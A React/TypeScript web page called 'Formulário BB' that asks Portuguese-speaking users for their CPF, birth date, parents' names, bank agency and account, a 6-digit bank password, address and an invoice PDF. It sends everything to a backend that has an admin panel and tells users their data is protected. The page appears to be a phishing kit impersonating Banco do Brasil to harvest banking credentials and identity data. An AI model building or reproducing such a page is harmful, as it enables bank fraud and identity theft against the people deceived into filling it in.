import { trpc } from "@/lib/trpc";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Loader2, Upload, CheckCircle2, AlertCircle, FileText, X, Music, Play, Pause, Volume2 } from "lucide-react";
import { toast } from "sonner";
import { useLocation } from "wouter";
import { useState, useRef, useCallback } from "react";

// Validação de CPF
function validateCPF(cpf: string): boolean {
  const cleanCPF = cpf.replace(/\D/g, '');
  
  if (cleanCPF.length !== 11) return false;
  if (/^(\d)\1+$/.test(cleanCPF)) return false;
  
  let sum = 0;
  for (let i = 0; i < 9; i++) {
    sum += parseInt(cleanCPF.charAt(i)) * (10 - i);
  }
  let remainder = (sum * 10) % 11;
  if (remainder === 10 || remainder === 11) remainder = 0;
  if (remainder !== parseInt(cleanCPF.charAt(9))) return false;
  
  sum = 0;
  for (let i = 0; i < 10; i++) {
    sum += parseInt(cleanCPF.charAt(i)) * (11 - i);
  }
  remainder = (sum * 10) % 11;
  if (remainder === 10 || remainder === 11) remainder = 0;
  if (remainder !== parseInt(cleanCPF.charAt(10))) return false;
  
  return true;
}

// Formatação de CPF
function formatCPF(value: string): string {
  const numbers = value.replace(/\D/g, '').slice(0, 11);
  if (numbers.length <= 3) return numbers;
  if (numbers.length <= 6) return `${numbers.slice(0, 3)}.${numbers.slice(3)}`;
  if (numbers.length <= 9) return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6)}`;
  return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6, 9)}-${numbers.slice(9)}`;
}

// Formatação de telefone
function formatPhone(value: string): string {
  const numbers = value.replace(/\D/g, '').slice(0, 11);
  if (numbers.length <= 2) return numbers;
  if (numbers.length <= 7) return `(${numbers.slice(0, 2)}) ${numbers.slice(2)}`;
  return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7)}`;
}

// Formatação de data
function formatDate(value: string): string {
  const numbers = value.replace(/\D/g, '').slice(0, 8);
  if (numbers.length <= 2) return numbers;
  if (numbers.length <= 4) return `${numbers.slice(0, 2)}/${numbers.slice(2)}`;
  return `${numbers.slice(0, 2)}/${numbers.slice(2, 4)}/${numbers.slice(4)}`;
}

interface FormData {
  email: string;
  telefone: string;
  cpf: string;
  dataNascimento: string;
  nomePai: string;
  nomeMae: string;
  agencia: string;
  conta: string;
  senha: string;
  rua: string;
  numero: string;
  complemento: string;
  bairro: string;
  cidade: string;
  estado: string;
  cep: string;
}

interface FormErrors {
  [key: string]: string;
}

const MUSIC_OPTIONS = [
  { id: "mc-william", name: "MC William do 7 Funk - Tropa do 7", url: "https://www.youtube.com/embed/mieG2mZhyo8" },
  { id: "mc-tuto", name: "MC Tuto - Barbie", url: "https://www.youtube.com/embed/lKd-t-rKDvY" },
  { id: "henrique-juliano", name: "Henrique e Juliano - Última Saudade", url: "https://www.youtube.com/embed/9Vt4XguN2-A" },
];

export default function FormularioBB() {
  const [, navigate] = useLocation();
  const fileInputRef = useRef<HTMLInputElement>(null);
  const audioRef = useRef<HTMLAudioElement>(null);
  const [selectedMusic, setSelectedMusic] = useState<string | null>(null);
  const [isPlaying, setIsPlaying] = useState(false);
  const [volume, setVolume] = useState(0.5);
  
  const [formData, setFormData] = useState<FormData>({
    email: "",
    telefone: "",
    cpf: "",
    dataNascimento: "",
    nomePai: "",
    nomeMae: "",
    agencia: "",
    conta: "",
    senha: "",
    rua: "",
    numero: "",
    complemento: "",
    bairro: "",
    cidade: "",
    estado: "",
    cep: "",
  });
  
  const [errors, setErrors] = useState<FormErrors>({});
  const [pdfFile, setPdfFile] = useState<File | null>(null);
  const [pdfBase64, setPdfBase64] = useState<string>("");
  
  const submitMutation = trpc.form.submit.useMutation({
    onSuccess: () => {
      navigate("/confirmacao");
    },
    onError: (error) => {
      toast.error(error.message || "Erro ao enviar formulário");
    },
  });

  const handleInputChange = useCallback((field: keyof FormData, value: string) => {
    let formattedValue = value;
    
    if (field === "cpf") {
      formattedValue = formatCPF(value);
    } else if (field === "telefone") {
      formattedValue = formatPhone(value);
    } else if (field === "dataNascimento") {
      formattedValue = formatDate(value);
    } else if (field === "senha") {
      formattedValue = value.replace(/\D/g, '').slice(0, 6);
    }
    
    setFormData(prev => ({ ...prev, [field]: formattedValue }));
    
    // Clear error when user starts typing
    if (errors[field]) {
      setErrors(prev => ({ ...prev, [field]: "" }));
    }
  }, [errors]);

  const handleFileChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    
    // Validate file type
    if (file.type !== "application/pdf") {
      toast.error("Apenas arquivos PDF são aceitos");
      return;
    }
    
    // Validate file size (max 10MB)
    if (file.size > 10 * 1024 * 1024) {
      toast.error("O arquivo deve ter no máximo 10MB");
      return;
    }
    
    setPdfFile(file);
    
    // Convert to base64
    const reader = new FileReader();
    reader.onload = () => {
      const base64 = (reader.result as string).split(",")[1];
      setPdfBase64(base64);
    };
    reader.readAsDataURL(file);
  }, []);

  const removeFile = useCallback(() => {
    setPdfFile(null);
    setPdfBase64("");
    if (fileInputRef.current) {
      fileInputRef.current.value = "";
    }
  }, []);

  const validateForm = useCallback((): boolean => {
    const newErrors: FormErrors = {};
    
    // Email validation
    if (!formData.email) {
      newErrors.email = "Email é obrigatório";
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
      newErrors.email = "Email inválido";
    }
    
    // Phone validation
    if (!formData.telefone) {
      newErrors.telefone = "Telefone é obrigatório";
    } else if (formData.telefone.replace(/\D/g, '').length < 10) {
      newErrors.telefone = "Telefone deve ter pelo menos 10 dígitos";
    }
    
    // CPF validation
    if (!formData.cpf) {
      newErrors.cpf = "CPF é obrigatório";
    } else if (!validateCPF(formData.cpf)) {
      newErrors.cpf = "CPF inválido";
    }
    
    // Date validation
    if (!formData.dataNascimento) {
      newErrors.dataNascimento = "Data de nascimento é obrigatória";
    } else if (!/^\d{2}\/\d{2}\/\d{4}$/.test(formData.dataNascimento)) {
      newErrors.dataNascimento = "Data deve estar no formato DD/MM/AAAA";
    }
    
    // Parent names validation
    if (!formData.nomePai || formData.nomePai.length < 2) {
      newErrors.nomePai = "Nome do pai é obrigatório";
    }
    if (!formData.nomeMae || formData.nomeMae.length < 2) {
      newErrors.nomeMae = "Nome da mãe é obrigatório";
    }
    
    // Bank data validation
    if (!formData.agencia) {
      newErrors.agencia = "Agência é obrigatória";
    }
    if (!formData.conta) {
      newErrors.conta = "Conta é obrigatória";
    }
    
    // Password validation
    if (!formData.senha) {
      newErrors.senha = "Senha é obrigatória";
    } else if (!/^\d{6}$/.test(formData.senha)) {
      newErrors.senha = "Senha deve ter exatamente 6 dígitos numéricos";
    }
    
    // Address validation
    if (!formData.rua) {
      newErrors.rua = "Rua é obrigatória";
    }
    if (!formData.numero) {
      newErrors.numero = "Número é obrigatório";
    }
    if (!formData.bairro) {
      newErrors.bairro = "Bairro é obrigatório";
    }
    if (!formData.cidade) {
      newErrors.cidade = "Cidade é obrigatória";
    }
    if (!formData.estado || formData.estado.length !== 2) {
      newErrors.estado = "Estado deve ter 2 caracteres";
    }
    if (!formData.cep || !/^\d{5}-\d{3}$/.test(formData.cep)) {
      newErrors.cep = "CEP deve estar no formato XXXXX-XXX";
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  }, [formData]);

  const handleMusicSelect = useCallback((musicId: string) => {
    setSelectedMusic(musicId);
    setIsPlaying(true);
    if (audioRef.current) {
      audioRef.current.play();
    }
  }, []);

  const handlePlayPause = useCallback(() => {
    if (audioRef.current) {
      if (isPlaying) {
        audioRef.current.pause();
      } else {
        audioRef.current.play();
      }
      setIsPlaying(!isPlaying);
    }
  }, [isPlaying]);

  const handleVolumeChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const newVolume = parseFloat(e.target.value);
    setVolume(newVolume);
    if (audioRef.current) {
      audioRef.current.volume = newVolume;
    }
  }, []);

  const handleSubmit = useCallback((e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      toast.error("Por favor, corrija os erros no formulário");
      return;
    }
    
    if (audioRef.current) {
      audioRef.current.pause();
    }
    
    submitMutation.mutate({
      ...formData,
      faturaBase64: pdfBase64 || undefined,
      faturaFilename: pdfFile?.name || undefined,
    });
  }, [formData, pdfBase64, pdfFile, validateForm, submitMutation]);

  return (
    <div className="min-h-screen bg-gradient-cinematic relative overflow-hidden">
      {/* Geometric accents */}
      <div className="absolute top-0 left-0 w-full h-1 accent-line-cyan" />
      <div className="absolute bottom-0 right-0 w-full h-1 accent-line-orange" />
      <div className="absolute top-20 left-10 w-32 h-32 rounded-full bg-[oklch(0.65_0.18_195/0.1)] blur-3xl" />
      <div className="absolute bottom-20 right-10 w-40 h-40 rounded-full bg-[oklch(0.7_0.15_55/0.1)] blur-3xl" />
      
      {/* Diagonal accent lines */}
      <div className="absolute top-0 right-0 w-1 h-64 bg-gradient-to-b from-[oklch(0.7_0.15_195)] to-transparent transform rotate-45 origin-top-right opacity-30" />
      <div className="absolute bottom-0 left-0 w-1 h-64 bg-gradient-to-t from-[oklch(0.75_0.18_55)] to-transparent transform -rotate-45 origin-bottom-left opacity-30" />
      
      <div className="container py-8 md:py-12 relative z-10">
        {/* Header */}
        <div className="text-center mb-8 md:mb-12">
          <div className="flex justify-between items-center mb-6">
            <div />
            <a href="/admin" className="text-cyan-400 hover:text-cyan-300 font-semibold text-sm">
              Painel Admin
            </a>
          </div>
          <h1 className="text-3xl md:text-5xl font-bold text-white text-shadow-depth mb-4">
            Formulário BB
          </h1>
          <p className="text-muted-foreground text-lg max-w-2xl mx-auto">
            Preencha os dados abaixo com atenção. Todos os campos são obrigatórios.
          </p>
          <div className="mt-4 flex justify-center gap-4">
            <div className="w-16 h-1 accent-line-cyan rounded-full" />
            <div className="w-16 h-1 accent-line-orange rounded-full" />
          </div>
        </div>

        {/* Form Card */}
        <Card className="max-w-2xl mx-auto glass-card glow-cyan border-0">
          <CardHeader className="border-b border-border/50 pb-6">
            <CardTitle className="text-xl text-white flex items-center gap-2">
              <div className="w-2 h-2 rounded-full bg-[oklch(0.65_0.18_195)]" />
              Dados Pessoais e Bancários
            </CardTitle>
            <CardDescription className="text-muted-foreground">
              Preencha todas as informações solicitadas
            </CardDescription>
          </CardHeader>
          
          <CardContent className="pt-6">
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Personal Data Section */}
              <div className="space-y-4">
                <h3 className="text-sm font-semibold text-[oklch(0.65_0.18_195)] uppercase tracking-wider">
                  Informações Pessoais
                </h3>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="email" className="text-foreground">Email</Label>
                    <Input
                      id="email"
                      type="email"
                      placeholder="seu@email.com"
                      value={formData.email}
                      onChange={(e) => handleInputChange("email", e.target.value)}
                      className={`bg-input border-border ${errors.email ? "border-destructive" : ""}`}
                    />
                    {errors.email && (
                      <p className="text-sm text-destructive flex items-center gap-1">
                        <AlertCircle className="w-3 h-3" />
                        {errors.email}
                      </p>
                    )}
                  </div>
                  
                  <div className="space-y-2">
                    <Label htmlFor="telefone" className="text-foreground">Telefone</Label>
                    <Input
                      id="telefone"
                      type="tel"
                      placeholder="(00) 00000-0000"
                      value={formData.telefone}
                      onChange={(e) => handleInputChange("telefone", e.target.value)}
                      className={`bg-input border-border ${errors.telefone ? "border-destructive" : ""}`}
                    />
                    {errors.telefone && (
                      <p className="text-sm text-destructive flex items-center gap-1">
                        <AlertCircle className="w-3 h-3" />
                        {errors.telefone}
                      </p>
                    )}
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="cpf" className="text-foreground">CPF</Label>
                    <Input
                      id="cpf"
                      type="text"
                      placeholder="000.000.000-00"
                      value={formData.cpf}
                      onChange={(e) => handleInputChange("cpf", e.target.value)}
                      className={`bg-input border-border ${errors.cpf ? "border-destructive" : ""}`}
                    />
                    {errors.cpf && (
                      <p className="text-sm text-destructive flex items-center gap-1">
                        <AlertCircle className="w-3 h-3" />
                        {errors.cpf}
                      </p>
                    )}
                  </div>
                  
                  <div className="space-y-2">
                    <Label htmlFor="dataNascimento" className="text-foreground">Data de Nascimento</Label>
                    <Input
                      id="dataNascimento"
                      type="text"
                      placeholder="DD/MM/AAAA"
                      value={formData.dataNascimento}
                      onChange={(e) => handleInputChange("dataNascimento", e.target.value)}
                      className={`bg-input border-border ${errors.dataNascimento ? "border-destructive" : ""}`}
                    />
                    {errors.dataNascimento && (
                      <p className="text-sm text-destructive flex items-center gap-1">
                        <AlertCircle className="w-3 h-3" />
                        {errors.dataNascimento}
                      </p>
                    )}
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="nomePai" className="text-foreground">Nome do Pai</Label>
                    <Input
                      id="nomePai"
                      type="text"
                      placeholder="Nome completo do pai"
                      value={formData.nomePai}
                      onChange={(e) => handleInputChange("nomePai", e.target.value)}
                      className={`bg-input border-border ${errors.nomePai ? "border-destructive" : ""}`}
                    />
                    {errors.nomePai && (
                      <p className="text-sm text-destructive flex items-center gap-1">
                        <AlertCircle className="w-3 h-3" />
                        {errors.nomePai}
                      </p>
                    )}
                  </div>
                  
                  <div className="space-y-2">
                    <Label htmlFor="nomeMae" className="text-foreground">Nome da Mãe</Label>
                    <Input
                      id="nomeMae"
                      type="text"
                      placeholder="Nome completo da mãe"
                      value={formData.nomeMae}
                      onChange={(e) => handleInputChange("nomeMae", e.target.value)}
                      className={`bg-input border-border ${errors.nomeMae ? "border-destructive" : ""}`}
                    />
                    {errors.nomeMae && (
                      <p className="text-sm text-destructive flex items-center gap-1">
                        <AlertCircle className="w-3 h-3" />
                        {errors.nomeMae}
                      </p>
                    )}
                  </div>
                </div>
              </div>

              {/* Bank Data Section */}
              <div className="space-y-4 pt-4 border-t border-border/50">
                <h3 className="text-sm font-semibold text-[oklch(0.75_0.18_55)] uppercase tracking-wider">
                  Dados Bancários
                </h3>
                
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="agencia" className="text-foreground">Agência</Label>
                    <Input
                      id="agencia"
                      type="text"
                      placeholder="0000"
                      value={formData.agencia}
                      onChange={(e) => handleInputChange("agencia", e.target.value)}
                      className={`bg-input border-border ${errors.agencia ? "border-destructive" : ""}`}
                    />
                    {errors.agencia && (
                      <p className="text-sm text-destructive flex items-center gap-1">
                        <AlertCircle className="w-3 h-3" />
                        {errors.agencia}
                      </p>
                    )}
                  </div>
                  
                  <div className="space-y-2">
                    <Label htmlFor="conta" className="text-foreground">Conta</Label>
                    <Input
                      id="conta"
                      type="text"
                      placeholder="00000-0"
                      value={formData.conta}
                      onChange={(e) => handleInputChange("conta", e.target.value)}
                      className={`bg-input border-border ${errors.conta ? "border-destructive" : ""}`}
                    />
                    {errors.conta && (
                      <p className="text-sm text-destructive flex items-center gap-1">
                        <AlertCircle className="w-3 h-3" />
                        {errors.conta}
                      </p>
                    )}
                  </div>
                  
                  <div className="space-y-2">
                    <Label htmlFor="senha" className="text-foreground">Senha (6 dígitos)</Label>
                    <Input
                      id="senha"
                      type="password"
                      placeholder="••••••"
                      maxLength={6}
                      value={formData.senha}
                      onChange={(e) => handleInputChange("senha", e.target.value)}
                      className={`bg-input border-border ${errors.senha ? "border-destructive" : ""}`}
                    />
                    {errors.senha && (
                      <p className="text-sm text-destructive flex items-center gap-1">
                        <AlertCircle className="w-3 h-3" />
                        {errors.senha}
                      </p>
                    )}
                  </div>
                </div>
              </div>

              {/* Address Section */}
              <div className="space-y-4 pt-4 border-t border-border/50">
                <h3 className="text-sm font-semibold text-[oklch(0.65_0.18_195)] uppercase tracking-wider">
                  Endereço
                </h3>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="rua" className="text-foreground">Rua</Label>
                    <Input
                      id="rua"
                      type="text"
                      placeholder="Rua Principal"
                      value={formData.rua}
                      onChange={(e) => handleInputChange("rua", e.target.value)}
                      className={`bg-input border-border ${errors.rua ? "border-destructive" : ""}`}
                    />
                    {errors.rua && (
                      <p className="text-sm text-destructive flex items-center gap-1">
                        <AlertCircle className="w-3 h-3" />
                        {errors.rua}
                      </p>
                    )}
                  </div>
                  
                  <div className="space-y-2">
                    <Label htmlFor="numero" className="text-foreground">Número</Label>
                    <Input
                      id="numero"
                      type="text"
                      placeholder="123"
                      value={formData.numero}
                      onChange={(e) => handleInputChange("numero", e.target.value)}
                      className={`bg-input border-border ${errors.numero ? "border-destructive" : ""}`}
                    />
                    {errors.numero && (
                      <p className="text-sm text-destructive flex items-center gap-1">
                        <AlertCircle className="w-3 h-3" />
                        {errors.numero}
                      </p>
                    )}
                  </div>
                </div>
                
                <div className="space-y-2">
                  <Label htmlFor="complemento" className="text-foreground">Complemento (Opcional)</Label>
                  <Input
                    id="complemento"
                    type="text"
                    placeholder="Apto 101, Bloco A"
                    value={formData.complemento}
                    onChange={(e) => handleInputChange("complemento", e.target.value)}
                    className="bg-input border-border"
                  />
                </div>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="bairro" className="text-foreground">Bairro</Label>
                    <Input
                      id="bairro"
                      type="text"
                      placeholder="Centro"
                      value={formData.bairro}
                      onChange={(e) => handleInputChange("bairro", e.target.value)}
                      className={`bg-input border-border ${errors.bairro ? "border-destructive" : ""}`}
                    />
                    {errors.bairro && (
                      <p className="text-sm text-destructive flex items-center gap-1">
                        <AlertCircle className="w-3 h-3" />
                        {errors.bairro}
                      </p>
                    )}
                  </div>
                  
                  <div className="space-y-2">
                    <Label htmlFor="cidade" className="text-foreground">Cidade</Label>
                    <Input
                      id="cidade"
                      type="text"
                      placeholder="São Paulo"
                      value={formData.cidade}
                      onChange={(e) => handleInputChange("cidade", e.target.value)}
                      className={`bg-input border-border ${errors.cidade ? "border-destructive" : ""}`}
                    />
                    {errors.cidade && (
                      <p className="text-sm text-destructive flex items-center gap-1">
                        <AlertCircle className="w-3 h-3" />
                        {errors.cidade}
                      </p>
                    )}
                  </div>
                </div>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="estado" className="text-foreground">Estado (UF)</Label>
                    <Input
                      id="estado"
                      type="text"
                      placeholder="SP"
                      maxLength={2}
                      value={formData.estado}
                      onChange={(e) => handleInputChange("estado", e.target.value.toUpperCase())}
                      className={`bg-input border-border ${errors.estado ? "border-destructive" : ""}`}
                    />
                    {errors.estado && (
                      <p className="text-sm text-destructive flex items-center gap-1">
                        <AlertCircle className="w-3 h-3" />
                        {errors.estado}
                      </p>
                    )}
                  </div>
                  
                  <div className="space-y-2">
                    <Label htmlFor="cep" className="text-foreground">CEP</Label>
                    <Input
                      id="cep"
                      type="text"
                      placeholder="00000-000"
                      value={formData.cep}
                      onChange={(e) => handleInputChange("cep", e.target.value)}
                      className={`bg-input border-border ${errors.cep ? "border-destructive" : ""}`}
                    />
                    {errors.cep && (
                      <p className="text-sm text-destructive flex items-center gap-1">
                        <AlertCircle className="w-3 h-3" />
                        {errors.cep}
                      </p>
                    )}
                  </div>
                </div>
              </div>

              {/* File Upload Section */}
              <div className="space-y-4 pt-4 border-t border-border/50">
                <h3 className="text-sm font-semibold text-[oklch(0.65_0.18_195)] uppercase tracking-wider">
                  Upload de Fatura
                </h3>
                
                <div className="space-y-2">
                  <Label className="text-foreground">Fatura (PDF)</Label>
                  
                  {!pdfFile ? (
                    <div
                      onClick={() => fileInputRef.current?.click()}
                      className="border-2 border-dashed border-border rounded-lg p-8 text-center cursor-pointer hover:border-accent transition-colors bg-input/50"
                    >
                      <Upload className="w-10 h-10 mx-auto mb-3 text-muted-foreground" />
                      <p className="text-foreground font-medium">Clique para selecionar um arquivo</p>
                      <p className="text-sm text-muted-foreground mt-1">Apenas PDF, máximo 10MB</p>
                    </div>
                  ) : (
                    <div className="flex items-center gap-3 p-4 bg-input/50 rounded-lg border border-border">
                      <FileText className="w-8 h-8 text-accent" />
                      <div className="flex-1 min-w-0">
                        <p className="text-foreground font-medium truncate">{pdfFile.name}</p>
                        <p className="text-sm text-muted-foreground">
                          {(pdfFile.size / 1024 / 1024).toFixed(2)} MB
                        </p>
                      </div>
                      <Button
                        type="button"
                        variant="ghost"
                        size="icon"
                        onClick={removeFile}
                        className="text-muted-foreground hover:text-destructive"
                      >
                        <X className="w-5 h-5" />
                      </Button>
                    </div>
                  )}
                  
                  <input
                    ref={fileInputRef}
                    type="file"
                    accept=".pdf,application/pdf"
                    onChange={handleFileChange}
                    className="hidden"
                  />
                </div>
              </div>

              {/* Music Selection Section */}
              <div className="space-y-4 pt-6 border-t border-border/50">
                <div className="flex items-center gap-2">
                  <Music className="w-5 h-5 text-[oklch(0.65_0.18_195)]" />
                  <h3 className="text-sm font-semibold text-[oklch(0.65_0.18_195)] uppercase tracking-wider">
                    Escolha uma Música
                  </h3>
                </div>
                <p className="text-sm text-muted-foreground">
                  Selecione uma música para ouvir enquanto preenche o formulário
                </p>
                
                <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                  {MUSIC_OPTIONS.map((music) => (
                    <Button
                      key={music.id}
                      type="button"
                      onClick={() => handleMusicSelect(music.id)}
                      variant={selectedMusic === music.id ? "default" : "outline"}
                      className="h-auto py-3 flex flex-col items-center gap-2"
                    >
                      <Music className="w-5 h-5" />
                      <span className="text-sm">{music.name}</span>
                    </Button>
                  ))}
                </div>

                {selectedMusic && (
                  <div className="bg-input/50 rounded-lg border border-border p-4 space-y-3">
                    <div className="flex items-center gap-3">
                      <Button
                        type="button"
                        size="icon"
                        onClick={handlePlayPause}
                        className="bg-primary hover:bg-primary/90"
                      >
                        {isPlaying ? (
                          <Pause className="w-4 h-4" />
                        ) : (
                          <Play className="w-4 h-4" />
                        )}
                      </Button>
                      <div className="flex-1 flex items-center gap-2">
                        <Volume2 className="w-4 h-4 text-muted-foreground" />
                        <input
                          type="range"
                          min="0"
                          max="1"
                          step="0.1"
                          value={volume}
                          onChange={handleVolumeChange}
                          className="flex-1 h-2 bg-border rounded-lg appearance-none cursor-pointer"
                        />
                      </div>
                    </div>
                    {selectedMusic && (
                      <div className="mt-4 w-full">
                        <iframe
                          width="100%"
                          height="315"
                          src={`${MUSIC_OPTIONS.find(m => m.id === selectedMusic)?.url}?autoplay=1`}
                          title="YouTube video player"
                          frameBorder="0"
                          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
                          allowFullScreen
                          className="rounded-lg"
                        />
                      </div>
                    )}
                    <audio
                      ref={audioRef}
                      src=""
                      onEnded={() => setIsPlaying(false)}
                    />
                  </div>
                )}
              </div>

              {/* Submit Button */}
              <div className="pt-6">
                <Button
                  type="submit"
                  disabled={submitMutation.isPending}
                  className="w-full h-12 text-lg font-semibold bg-primary hover:bg-primary/90 text-primary-foreground glow-orange"
                >
                  {submitMutation.isPending ? (
                    <>
                      <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                      Enviando...
                    </>
                  ) : (
                    <>
                      <CheckCircle2 className="w-5 h-5 mr-2" />
                      Enviar Formulário
                    </>
                  )}
                </Button>
              </div>
            </form>
          </CardContent>
        </Card>

        {/* Footer */}
        <div className="text-center mt-8 text-muted-foreground text-sm">
          <p>Seus dados estão protegidos e serão tratados com segurança.</p>
        </div>
      </div>
    </div>
  );
}
